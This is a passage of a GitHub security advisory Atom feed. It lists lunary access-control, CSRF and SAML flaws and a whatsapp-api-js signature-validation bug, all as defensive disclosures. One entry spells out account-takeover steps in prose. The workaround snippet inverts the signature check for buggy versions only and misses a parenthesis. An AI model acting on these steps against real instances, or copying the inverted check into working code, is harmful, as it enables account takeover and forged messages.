        <category label="severity" term="MODERATE"/>
        <published>2024-09-16T14:37:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lunary] Lunary information disclosure vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9jmp-j63g-8x6m</id>
        <link href="https://github.com/advisories/GHSA-9jmp-j63g-8x6m"/>
        <updated>2024-09-13T19:34:17.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure vulnerability exists in the lunary-ai/lunary, specifically in the <code>runs/{run_id}/related</code> endpoint. This endpoint does not verify that the user has the necessary access rights to the run(s) they are accessing. As a result, it returns not only the specified run but also all runs that have the <code>run_id</code> listed as their parent run. This issue affects the main branch, commit a761d833. The vulnerability allows unauthorized users to obtain information about non-public runs and their related runs, given the <code>run_id</code> of a public or non-public run.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6867">https://nvd.nist.gov/vuln/detail/CVE-2024-6867</a></li>
<li><a href="https://github.com/lunary-ai/lunary/commit/35afd4439464571eb016318cd7b6f85a162225ca">https://github.com/lunary-ai/lunary/commit/35afd4439464571eb016318cd7b6f85a162225ca</a></li>
<li><a href="https://huntr.com/bounties/460df515-164c-4435-954b-0233a181545f">https://huntr.com/bounties/460df515-164c-4435-954b-0233a181545f</a></li>
<li><a href="https://github.com/advisories/GHSA-9jmp-j63g-8x6m">https://github.com/advisories/GHSA-9jmp-j63g-8x6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jmp-j63g-8x6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-13T18:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lunary] Lunary Cross-Site Request Forgery (CSRF) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v6x6-4v4x-2fx9</id>
        <link href="https://github.com/advisories/GHSA-v6x6-4v4x-2fx9"/>
        <updated>2024-09-13T19:34:11.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Request Forgery (CSRF) vulnerability exists in lunary-ai/lunary version 1.2.34 due to overly permissive CORS settings. This vulnerability allows an attacker to sign up for and create projects or use the instance as if they were a user with local access. The main attack vector is for instances hosted locally on personal machines, which are not publicly accessible. The CORS settings in the backend permit all origins, exposing unauthenticated endpoints to CSRF attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6862">https://nvd.nist.gov/vuln/detail/CVE-2024-6862</a></li>
<li><a href="https://github.com/lunary-ai/lunary/commit/3451fcd7b9d95e9091d62c515752f39f2faa6e54">https://github.com/lunary-ai/lunary/commit/3451fcd7b9d95e9091d62c515752f39f2faa6e54</a></li>
<li><a href="https://huntr.com/bounties/0b1d851e-3455-480c-ad5a-23565894976f">https://huntr.com/bounties/0b1d851e-3455-480c-ad5a-23565894976f</a></li>
<li><a href="https://github.com/advisories/GHSA-v6x6-4v4x-2fx9">https://github.com/advisories/GHSA-v6x6-4v4x-2fx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6x6-4v4x-2fx9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-13T18:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lunary] Lunary Improper Authentication vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w73r-8mm4-cfvf</id>
        <link href="https://github.com/advisories/GHSA-w73r-8mm4-cfvf"/>
        <updated>2024-09-13T19:29:16.000Z</updated>
        <content type="html"><![CDATA[<p>A broken access control vulnerability exists prior to commit 1f043d8798ad87346dfe378eea723bff78ad7433 of lunary-ai/lunary. The <code>saml.ts</code> file allows a user from one organization to update the Identity Provider (IDP) settings and view the SSO metadata of another organization. This vulnerability can lead to unauthorized access and potential account takeover if the email of a user in the target organization is known.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6582">https://nvd.nist.gov/vuln/detail/CVE-2024-6582</a></li>
<li><a href="https://github.com/lunary-ai/lunary/commit/1f043d8798ad87346dfe378eea723bff78ad7433">https://github.com/lunary-ai/lunary/commit/1f043d8798ad87346dfe378eea723bff78ad7433</a></li>
<li><a href="https://huntr.com/bounties/251d138c-3911-4a81-96e5-5a4ab59a0b59">https://huntr.com/bounties/251d138c-3911-4a81-96e5-5a4ab59a0b59</a></li>
<li><a href="https://github.com/advisories/GHSA-w73r-8mm4-cfvf">https://github.com/advisories/GHSA-w73r-8mm4-cfvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w73r-8mm4-cfvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-13T18:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lunary] Lunary improper access control vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6p2q-8qfq-wq7x</id>
        <link href="https://github.com/advisories/GHSA-6p2q-8qfq-wq7x"/>
        <updated>2024-09-13T19:29:13.000Z</updated>
        <content type="html"><![CDATA[<p>An improper access control vulnerability exists in lunary-ai/lunary prior to commit 844e8855c7a713dc7371766dba4125de4007b1cf on the main branch. The vulnerability allows an attacker to use the auth tokens issued by the 'invite user' functionality to obtain valid JWT tokens. These tokens can be used to compromise target users upon registration for their own arbitrary organizations. The attacker can invite a target email, obtain a one-time use token, retract the invite, and later use the token to reset the password of the target user, leading to full account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6087">https://nvd.nist.gov/vuln/detail/CVE-2024-6087</a></li>
<li><a href="https://github.com/lunary-ai/lunary/commit/844e8855c7a713dc7371766dba4125de4007b1cf">https://github.com/lunary-ai/lunary/commit/844e8855c7a713dc7371766dba4125de4007b1cf</a></li>
<li><a href="https://huntr.com/bounties/bd9f2301-11c7-4cbd-8d77-3e9225bd67e8">https://huntr.com/bounties/bd9f2301-11c7-4cbd-8d77-3e9225bd67e8</a></li>
<li><a href="https://github.com/advisories/GHSA-6p2q-8qfq-wq7x">https://github.com/advisories/GHSA-6p2q-8qfq-wq7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6p2q-8qfq-wq7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-13T18:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whatsapp-api-js] whatsapp-api-js fails to validate message's signature]]></title>
        <id>https://github.com/advisories/GHSA-mwhf-vhr5-7j23</id>
        <link href="https://github.com/advisories/GHSA-mwhf-vhr5-7j23"/>
        <updated>2024-09-12T21:39:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Incorrect Access Control, anyone using the post or verifyRequestSignature methods to handle messages is impacted.</p>
<h3 id="patches">Patches</h3>
<p>Patched in version 4.0.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It's possible to check the payload validation using the WhatsAppAPI.verifyRequestSignature and expect false when the signature is valid.</p>
<pre><code class="language-ts">function doPost(payload, header_signature) {
    if (whatsapp.verifyRequestSignature(payload.toString(), header_signature) {
        throw 403;
    }
    
    // Now the payload is correctly verified
    whatsapp.post(payload);
}
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://github.com/Secreto31126/whatsapp-api-js/pull/371">https://github.com/Secreto31126/whatsapp-api-js/pull/371</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Secreto31126/whatsapp-api-js/security/advisories/GHSA-mwhf-vhr5-7j23">https://github.com/Secreto31126/whatsapp-api-js/security/advisories/GHSA-mwhf-vhr5-7j23</a></li>
<li><a href="https://github.com/Secreto31126/whatsapp-api-js/pull/371">https://github.com/Secreto31126/whatsapp-api-js/pull/371</a></li>
<li><a href="https://github.com/Secreto31126/whatsapp-api-js/commit/56620c65126427496a94d176082fbd8393a95b6d">https://github.com/Secreto31126/whatsapp-api-js/commit/56620c65126427496a94d176082fbd8393a95b6d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45607">https://nvd.nist.gov/vuln/detail/CVE-2024-45607</a></li>
<li><a href="https://github.com/advisories/GHSA-mwhf-vhr5-7j23">https://github.com/advisories/GHSA-mwhf-vhr5-7j23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwhf-vhr5-7j23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-12T21:29:17.000Z</published>
    </entry>
</feed>